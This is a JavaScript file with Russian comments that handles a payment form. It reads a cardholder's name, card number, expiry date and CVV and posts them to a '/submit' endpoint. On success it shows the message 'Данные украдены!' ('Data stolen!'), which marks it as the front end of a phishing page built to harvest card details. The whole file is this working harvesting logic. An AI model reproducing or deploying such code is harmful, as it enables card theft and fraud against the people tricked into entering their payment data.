document.addEventListener("DOMContentLoaded", () => {
    const form = document.getElementById("paymentForm");

    form.addEventListener("submit", async (e) => {
        e.preventDefault(); // не даём браузеру перезагрузить страницу

        const name = document.getElementById("name").value.trim();
        const cardNumber = document.getElementById("card").value.trim().replace(/\s/g, "");
        const expiryDate = document.getElementById("expiry").value.trim();
        const cvv = document.getElementById("cvv").value.trim();

        // Проверка на пустые поля
        if (!name || !cardNumber || !expiryDate || !cvv) {
            alert("Заполните все поля!");
            return;
        }

        try {
            const response = await fetch("/submit", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    name: name,
                    card_number: cardNumber,
                    expiry_date: expiryDate,
                    cvv: cvv
                })
            });

            const result = await response.json();

            if (response.ok) {
                alert(result.message || "Данные украдены!");
                form.reset(); // очищаем форму
            } else {
                alert("Ошибка: " + (result.message || "Неизвестная ошибка"));
            }
        } catch (err) {
            console.error("Ошибка при отправке:", err);
            alert("Сервер не отвечает.");
        }
    });
});

